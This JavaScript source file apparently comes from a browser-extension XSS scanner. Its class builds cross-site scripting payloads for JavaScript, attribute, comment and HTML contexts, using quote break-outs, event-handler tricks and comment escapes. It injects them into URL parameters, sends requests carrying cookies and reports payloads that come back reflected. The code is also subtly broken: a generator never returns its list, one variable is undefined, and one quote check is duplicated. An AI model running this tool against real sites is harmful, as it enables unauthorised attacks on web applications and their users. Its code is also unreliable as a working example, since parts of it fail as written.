import Advance_Filter_Finder       from "./advanced_filterfinder.js";
import { Sender }                  from "./messegeController.js";
import Input_Parser                from "./inputpaser.js";
import { 
    START_CHUNCK, END_CHUNK, ATTACK_RESULT, ATTACK_DATA,PAY_HTML, 
    PAY_FUNC, PAY_EVENT, PAY_JAVASCRIPT_CODE, PAY_JAVASCRIPT_TAG, PAY_ATTR_FUNC,FG
} from "./config.js";


// {payload : "", response : "", param : "", url : "", target : ""}
export default class Payload_Ztel extends Advance_Filter_Finder{
    constructor(){
        super();
        this.parser       = new Input_Parser();
        this.attack_msg   = {};  
        this.payload_list = [];
    }


    #find_param(param){
        let filter_data = Object.assign({}, this.filter_result);
        let param_data  = filter_data[param];
        if(param_data[reflection]) return false;
        return param_data;
    }

    #find_ft_result_data(param, target){
        let param_data = this.#find_param(param);
        if(!param_data) return false;
        let ft_result  = param_data[target];
        return ft_result;
    }

    // 이게 false가 아니라면 최소한 reflection은 확인된 상태 
    #find_attribute(param){
        return this.#find_ft_result_data(param, "attribute");
    }
    
    #find_javascript(param){
        return this.#find_ft_result_data(param, "javascript");
    }

    #find_comment(param){
        return this.#find_ft_result_data(param, "comment");
    }

    #find_html(param){
        return this.#find_ft_result_data(param, "html");
    }


    #success_key_ext(data){ // -> array
        let data_keys = Object.keys(data);
        let result = [];
        for(let data_key of data_keys){
            let filter_word = data[data_key];
            if(filter_word["all"] == filter_word["fail"])continue;
            result.push(data_key);
        }
        return result.length > 0 ? result : null;
    }

    
    #pay_gen(param){
        let payload = [];

        let js      = this.#find_javascript(param);
        let attr    = this.#find_attribute (param);
        let comm    = this.#find_comment   (param);
        let html    = this.#find_html      (param);

        let js_succ  ;
        let attr_succ;
        let comm_succ;
        let html_succ;
        
        if( js ){ js_succ  = this.#success_key_ext( js );}
        if(attr){attr_succ = this.#success_key_ext(attr);}
        if(comm){comm_succ = this.#success_key_ext(comm);}
        if(html){html_succ = this.#success_key_ext(html);}

        if(js_succ   != null){payload.push(["javascript", this.#javascript_pay_gen(js_succ  )]);}
        if(attr_succ != null){payload.push(["attribute" , this.#attribute_pay_gen(attr_succ )]);} 
        if(comm_succ != null){payload.push(["comment"   , this.#html_pay_gen(comm_succ, true)]);}
        if(html_succ != null){payload.push(["html"      , this.#html_pay_gen(html_succ      )]);}
    }


    #html_pay_gen(success, comment=false){
        let payload = [];

        for(let html_pay of PAY_HTML){
            for(let func of PAY_FUNC){
                let one_pay = html_pay.replace(FG, func);
                if(comment){
                    payload.push("-->" + one_pay)
                }else payload.push(one_pay);
            }
        }
        return payload;
    }

    #attribute_pay_gen(success){
        let payload = [];
        let quote   = [];

        if(success.includes("\'")){quote.push("\'");}
        if(success.includes("'" )){quote.push("'" );}

        for(let event of PAY_EVENT){
            for(let func of PAY_ATTR_FUNC){
                if(event == "ontransitionend"){
                    event = event + "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend";
                }else if(event == "oncontentvisibilityautostatechange"){
                    event = event + "style=\"display:block;content-visibility:auto;\" oncontentvisibilityautostatechange";
                }
                let one_pay = event + func;

                if(quote.length > 0){
                    for(let one_quote of quote){payload.push(one_quote + one_pay)}
                }else{payload.push(one_pay);}
            }
        }
        return payload;
    }

    #javascript_pay_gen(success){
        let payload = [];
        let quote   = [];

        if(success.includes("\"")){quote.push("\"");}
        if(success.includes("'" )){quote.push("'" );}
        if(success.includes("</ScrIpT/>")){payload = payload.concat(PAY_JAVASCRIPT_TAG);}

        if(quote.length > 0){
            for(let js_code of PAY_JAVASCRIPT_CODE){
                for(let one_quote of quote){
                    payload.push(one_quote + "+" + js_code + "//");
                    payload.push(one_quote + ";" + js_code + "//");
                    payload.push(one_quote + "+" + js_code + "+" + one_quote);
                    payload.push(one_quote + "-" + js_code + "-" + one_quote);
                    payload.push(one_quote + js_code + one_quote);
                    payload.push("\\" + one_quote + js_code + "//");
                    payload.push("\\" + one_quote + ";" + js_code + "//");
                    payload.push("\\" + one_quote + "+" + js_code + "+" + one_quote);
                    payload.push("\\" + one_quote + "-" + js_code + "-" + one_quote);
                    payload.push("\\" + one_quote + js_code + one_quote);
                }
            }
        }else{
            for(let js_code of PAY_JAVASCRIPT_CODE){
                payload.push(";" + js_code + ";//");
                payload.push(";" + js_code + ";");
                payload.push(js_code);
            }
        }
        return payload;
    }

    #attack_setting(){
        this.attack_msg = {};
    }

    #pay_param_generator(url, param, payload){
        let copy_param     = Object.assign({}, param); 
        let check_pay      = START_CHUNCK + payload + END_CHUNK;
        check_pay          = encodeURIComponent(check_pay);
        let injected_param = this.payload_injector(copy_param, check_pay);
        let full_url       = this.url_generator(url, injected_param);
        return full_url;
    }

    #impl_attack_checker(response, payload, pay_type){
        let attack_res = this.test_value_extractor(response, pay_type);
        if(attack_res == " "    )return false;
        if(attack_res == payload) return true;
        return false
    }

    async #impl_dumb_attack_stub(url, param, delay, cookie=true, headers=null, target){
        let target_param = this.target_param_extractor(param);
        let payloads_list     = this.#pay_gen(target_param);
        console.log(payloads_list);

        for(let payloads of payloads_list){
            let payload  = payloads[1];
            let pay_type = payloads[0];

            for(let pay of payload){
                let full_url        = this.#pay_param_generator(url, param, pay); 
                let response_obj    = await this.get(full_url ,delay, cookie, headers); 
                if(Object.prototype.toString.call(response_obj) != "[object Response]"){continue;}
                let response        = await response_obj.text(); 

                if(this.#impl_attack_checker(response, pay, pay_type)){ this.#attack_msg_initialize(response, pay, full_url, url, target);}
            }
        }
    }

    #attack_msg_initialize(response, payload ,full_url, url, target){
        let pure_response           = response.replace(START_CHUNCK, "").replace(END_CHUNK, "");
        this.attack_msg["response"] = pure_response; 
        this.attack_msg["payload"]  = payload;
        this.attack_msg["param"]    = this.parser.param_extractor(full_url);
        this.attack_msg["url"]      = url; 
        this.attack_msg["target"]   = target;

        this.#send_attack_msg();
    }

    #send_attack_msg(){
        let sender          = new Sender(ATTACK_RESULT);
        let attack_msg_copy = Object.assign({}, this.attack_msg)
        sender.req_set({[ATTACK_DATA] : attack_msg_copy});
        sender.send(null, null);
    }

    async attack_factory(url, param, delay, cookie=true, headers=null, target){
        this.#attack_setting();
        await this.#impl_dumb_attack_stub(url, param, delay, cookie, headers, target);
    }
}